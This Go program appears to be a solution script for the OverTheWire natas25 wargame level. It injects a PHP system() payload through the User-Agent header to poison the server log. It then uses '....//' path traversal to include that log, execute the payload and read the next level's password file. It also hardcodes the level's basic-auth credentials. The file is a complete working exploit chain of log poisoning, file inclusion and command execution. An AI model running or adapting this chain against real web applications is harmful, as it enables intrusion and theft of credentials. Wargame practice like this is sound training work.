package main

import "fmt"
import "io/ioutil"
import "net/http"
import "net/url"
import "strings"

func getFlag(sessionid string) string {

	var result string = ""

	params := url.Values{}
	params.Set("lang", "natas_webpass")
	base_url := "http://natas25.natas.labs.overthewire.org/"
	real_url := base_url + "?" + params.Encode()

	client := &http.Client{}

	request1, _ := http.NewRequest("GET", real_url, nil)
	request1.Header.Add("Content-Type", "text/html")
	request1.Header.Add("Cookie", "PHPSESSID=" + sessionid)
	request1.Header.Add("User-Agent", "<?php echo(\"_C_O_O_K_I_E_\"); system(\"cat /etc/natas_webpass/natas26\"); echo(\"_C_O_O_K_I_E_\"); ?>")
	request1.SetBasicAuth("natas25", "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx")

	response1, err1 := client.Do(request1)

	if err1 == nil {

		_, err2 := ioutil.ReadAll(response1.Body)

		if err2 == nil {

			request2, _ := http.NewRequest("GET", base_url + "?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_" + sessionid + ".log", nil)
			request2.Header.Add("Content-Type", "text/html")
			request2.Header.Add("Cookie", "PHPSESSID=" + sessionid)
			request2.SetBasicAuth("natas25", "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx")

			response2, err3 := client.Do(request2)

			if err3 == nil {

				body, err4 := ioutil.ReadAll(response2.Body)

				if err4 == nil {

					contents := string(body)

					if strings.Contains(contents, "_C_O_O_K_I_E_") {

						tmp := strings.Split(contents, "_C_O_O_K_I_E_")

						if len(tmp) > 0 {
							result = strings.TrimSpace(tmp[1])
						}

					}

				}

			}

		}

	}

	return result

}

func getPHPSESSID() string {

	var result string = ""

	params := url.Values{}
	params.Set("lang", "en")
	base_url := "http://natas25.natas.labs.overthewire.org/"
	real_url := base_url + "?" + params.Encode()

	client := &http.Client{}

	request, _ := http.NewRequest("GET", real_url, nil)
	request.Header.Add("Content-Type", "text/html")
	request.SetBasicAuth("natas25", "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx")

	response, err1 := client.Do(request)

	if err1 == nil {

		_, err2 := ioutil.ReadAll(response.Body)

		if err2 == nil {

			cookies := response.Cookies()

			for _, cookie := range cookies {

				value := cookie.String()

				if strings.HasPrefix(value, "PHPSESSID=") {

					if strings.Contains(value, ";") {
						result = strings.TrimSpace(value[10:strings.Index(value, ";")])
					} else {
						result = strings.TrimSpace(value[10:])
					}

				}

			}

		}

	}

	return result

}

func main() {

	session_id := getPHPSESSID()
	flag := getFlag(session_id)

	fmt.Println(flag)

}

